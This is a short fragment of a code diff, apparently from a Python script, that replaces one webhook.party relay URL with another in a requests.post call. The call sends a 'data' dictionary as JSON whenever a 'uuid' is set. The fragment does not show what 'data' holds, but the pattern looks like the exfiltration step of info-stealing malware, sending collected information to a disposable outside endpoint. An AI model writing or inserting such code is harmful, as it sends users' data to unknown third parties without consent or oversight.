@@ -47,7 +47,7 @@ data = {#
 #
 if uuid:#
     response = requests.post(#
-        "https://l.webhook.party/hook/AFB29QblhgzPWfdxwmuZUkim86VSZOUFUlYNoJo5dU7%2Bf5aiPjmV7Y0O%2BlFRwTP%2BhlmnJGRNiqKmpym6ZJ1XfxbP7CCofwhzgWikMgKG9cdtRMUuZJ6sptRteS7RjnO1cRT6j7BJiax%2BdAmZouj%2B6722CtyPoqBTBXJ%2BIt81xiccwpFVJnbudDBMg4UQyW5Uwr3Bxmh6ofJq7RsNrcVPwugIbLqKohQvR9v7GEYrqU19mprCfrxgog0TULkF435csdkHXVOqxOGqPHHidJQDTXpEvccveCZcn%2FYCiwkwD8uTOZkh31xhE4syyrXXGJ0SlkPEcAlIJ1RCgwcI51dYBunRnO%2B8J3A%2BSna%2FvgV5f%2FQxKgEr6bjpmwqmopzq4fRHSUXUyCLtQ3M%3D/n7Be12FaMYalZukO",
+        "https://l.webhook.party/hook/nRBn6m7Ry%2FTrJgqsWP4KpAFbM4F3cF%2F5nIcITfsg0v2aOf24tNlVtvD6gH9sJE7imYjYNS2O5dBbK%2BxEOKKxWYfDCixfqD8yMFoHWqM4YI69JqO1zkcNinMIf8qKvzJ%2BfcUX1ZnF0wLzeYN2AGxWq5DcL7pVZl1GlWvnNNOix72TvHj27OjabPrxDtrTY4qo6KS%2BPRdvN3x59jxaj%2FPz1Ud2DSbwrT8ZL%2BEf0l6uK%2B7cXjkKOowrbRCBhGvDZ%2BQT7ZsTjB9d8H7xGh%2Buf6B0wZfondYaqrNEiVFniIPnJ7VMLwavIlkSU0xynUCGUIItF7FinJZhEdkmqcwJFn%2Fw%2FiEYmYGUcpXPb%2FnTMNhwfbuSCAPl80mWKuTr9KLVaCmXFk1Op2ZtlLc%3D/WAp%2FDRUYSqs00voB",
         json=data#
     )#
 #
